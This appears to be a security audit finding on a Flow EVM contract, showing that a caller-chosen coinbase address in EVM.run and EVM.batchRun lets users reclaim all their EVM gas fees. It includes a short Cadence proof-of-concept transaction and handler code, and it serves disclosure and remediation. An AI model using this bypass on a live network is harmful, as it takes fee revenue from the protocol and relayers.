### Title
User-Controlled `coinbase` in `EVM.run` / `EVM.batchRun` Allows Complete EVM Gas Fee Bypass - (File: fvm/evm/stdlib/contract.cdc)

---

### Summary

`EVM.run` and `EVM.batchRun` are `access(all)` Cadence functions that accept a fully user-controlled `coinbase: EVMAddress` argument. All EVM gas fees collected during execution are transferred to this address. Because any unprivileged Cadence transaction can call these functions and supply their own EVM address as `coinbase`, a user who is also the EOA signing the inner EVM transaction can route all gas fees back to themselves, achieving a net EVM gas cost of zero.

---

### Finding Description

`EVM.run` and `EVM.batchRun` in `fvm/evm/stdlib/contract.cdc` are declared `access(all)`, meaning any Cadence transaction can invoke them without restriction:

```cadence
access(all)
fun run(tx: [UInt8], coinbase: EVMAddress): Result { ... }

access(all)
fun batchRun(txs: [[UInt8]], coinbase: EVMAddress): [Result] { ... }
``` [1](#0-0) [2](#0-1) 

Both functions pass the caller-supplied `coinbase` bytes directly to `InternalEVM.run` / `InternalEVM.batchRun` as the `gasFeeCollector`. In the Go handler, `runWithGasFeeRefund` measures the balance increase at the protocol-internal `types.CoinbaseAddress` after execution and transfers the entire difference to the caller-supplied `gasFeeCollector`:

```go
func (h *ContractHandler) runWithGasFeeRefund(gasFeeCollector types.Address, f func()) {
    cb := h.AccountByAddress(types.CoinbaseAddress, true)
    initCoinbaseBalance := cb.Balance()
    f()
    afterBalance := cb.Balance()
    diff := new(big.Int).Sub(afterBalance, initCoinbaseBalance)
    if diff.Sign() > 0 {
        cb.Transfer(gasFeeCollector, diff)
    }
    ...
}
``` [3](#0-2) 

There is no check that `gasFeeCollector` is a designated protocol address, a staked relayer, or anything other than an arbitrary EVM address chosen by the caller.

---

### Impact Explanation

**Impact: High.** A user who controls both the EOA signing the inner EVM transaction and the `coinbase` argument can set `coinbase` to their own EVM address. The gas fees deducted from the EOA (`gas_used × gas_price`) are accumulated at `types.CoinbaseAddress` and then forwarded to the user's own address. The net EVM gas cost is zero. This allows any user to execute arbitrary EVM transactions — including contract deployments and calls — without paying any EVM gas fees, depriving the protocol and legitimate relayers of all fee revenue from those transactions.

---

### Likelihood Explanation

**Likelihood: High.** `EVM.run` and `EVM.batchRun` are `access(all)` — no capability, entitlement, or role is required. Any unprivileged Cadence transaction sender can call them. The attack requires only:
1. An EVM address the attacker controls (e.g., a COA or any EVM address they hold the private key for).
2. An inner EVM transaction signed with `gasPrice > 0`.
3. Passing their own EVM address as `coinbase`.

This is fully permissionless and trivially repeatable.

---

### Recommendation

The `coinbase` / `gasFeeCollector` argument should not be freely user-controlled. Options include:

1. **Protocol-fixed coinbase**: Remove the `coinbase` parameter from `EVM.run` / `EVM.batchRun` and hard-code the fee recipient to a protocol-controlled address (e.g., the FlowFees contract address or a designated fee vault), similar to how Cadence-level transaction fees are handled via `DeductTransactionFees`.
2. **Admin-set fee recipient**: Store an admin-configurable fee recipient address in the EVM contract state and use it unconditionally, preventing callers from redirecting fees.
3. **Access restriction**: Gate `EVM.run` / `EVM.batchRun` behind an entitlement or capability so only authorized relayers can call them, and separately enforce that the coinbase is the relayer's registered address.

---

### Proof of Concept

An attacker crafts the following Cadence transaction:

```cadence
import EVM from <EVMContractAddress>

transaction(tx: [UInt8]) {
    prepare(account: auth(BorrowValue) &Account) {
        // attacker's own COA address — they receive all gas fees back
        let myCOA = account.storage.borrow<&EVM.CadenceOwnedAccount>(
            from: /storage/evm
        )!
        let myEVMAddr = myCOA.address()

        // inner EVM tx is signed by the same EOA with gasPrice > 0
        // coinbase = attacker's own address → gas fees returned to attacker
        let result = EVM.run(tx: tx, coinbase: myEVMAddr)
        // result.status == successful, net EVM gas cost = 0
    }
}
```

The inner EVM transaction (`tx`) is signed by the attacker's EOA with `gasPrice = 1`. After execution, `runWithGasFeeRefund` transfers `gas_used × 1` attoflow from `CoinbaseAddress` to `myEVMAddr` (the attacker's address). The attacker's EVM balance is unchanged net of the operation; they have executed an EVM transaction for free.

// runWithGasFeeRefund runs a method and transfers the balance changes of the
// coinbase address to the provided gas fee collector
func (h *ContractHandler) runWithGasFeeRefund(gasFeeCollector types.Address, f func()) {
	// capture coinbase init balance
	cb := h.AccountByAddress(types.CoinbaseAddress, true)
	initCoinbaseBalance := cb.Balance()
	f()
	// transfer the gas fees collected to the gas fee collector address
	afterBalance := cb.Balance()
	diff := new(big.Int).Sub(afterBalance, initCoinbaseBalance)
	if diff.Sign() > 0 {
		cb.Transfer(gasFeeCollector, diff)
	}
	if diff.Sign() < 0 { // this should never happen but in case
		panic(fvmErrors.NewEVMError(fmt.Errorf("negative balance change on coinbase")))
	}
}
